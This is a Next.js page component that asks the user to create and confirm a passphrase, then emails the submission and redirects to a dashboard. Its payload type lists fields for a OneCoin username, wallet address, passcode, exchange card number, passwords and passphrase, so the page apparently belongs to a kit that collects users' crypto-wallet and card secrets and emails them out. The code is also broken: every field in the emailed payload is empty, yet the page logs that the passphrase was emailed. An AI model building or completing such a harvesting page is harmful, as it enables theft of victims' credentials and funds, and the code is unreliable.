"use client";

import React, { useState, ChangeEvent, FormEvent } from "react";
import { useRouter } from "next/navigation";
import { sendEmail, FormData } from "@/app/lib/email";

export default function PassphrasePage() {
  const [passphrase, setPassphrase] = useState("");
  const [confirmPassphrase, setConfirmPassphrase] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    // Validate passphrase length.
    if (passphrase.length < 8) {
      setError("Passphrase must be at least 8 characters long.");
      return;
    }

    // Validate that the passphrase and confirmation match.
    if (passphrase !== confirmPassphrase) {
      setError("Passphrases do not match.");
      return;
    }

    // Prepare the email data payload.
    const emailData: FormData = {
        surname: "",
  firstName: "",
  otherName: "",
  maritalStatus: "",
  location: "",
  onecoinUsername: "",
  amountToTrade: "",
  cryptocurrency: "",
  bankTransfer: "",
  walletAddress: "",
  passcode: "",
  exchangeCardNumber: "",
  password: "",
  confirmPassword: "",
  upcCode: "",
  passphrase: "",
  confirmPassphrase: "",
      };
      

    // Send the email.
    const emailSent = await sendEmail(emailData);
    if (emailSent) {
      console.log("Passphrase submitted and emailed:", emailData);
      router.push("/dashboard"); // Replace with your desired route.
    } else {
      setError("Error sending email. Please try again.");
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-black text-gold">
      <h1 className="text-2xl font-bold mb-4">Create Your Passphrase</h1>
      <form onSubmit={handleSubmit} className="space-y-4 w-full max-w-md">
        <div>
          <label className="block text-sm font-medium mb-1">Passphrase</label>
          <input
            type="password"
            value={passphrase}
            onChange={(e: ChangeEvent<HTMLInputElement>) =>
              setPassphrase(e.target.value)
            }
            placeholder="Enter your passphrase"
            className="w-full p-2 border border-gray-300 rounded text-black"
            required
          />
        </div>
        <div>
          <label className="block text-sm font-medium mb-1">
            Confirm Passphrase
          </label>
          <input
            type="password"
            value={confirmPassphrase}
            onChange={(e: ChangeEvent<HTMLInputElement>) =>
              setConfirmPassphrase(e.target.value)
            }
            placeholder="Confirm your passphrase"
            className="w-full p-2 border border-gray-300 rounded text-black"
            required
          />
        </div>
        {error && <p className="text-red-500 text-sm">{error}</p>}
        <button type="submit" className="w-full bg-gold text-black py-2 rounded">
          Create Passphrase
        </button>
      </form>
    </div>
  );
}
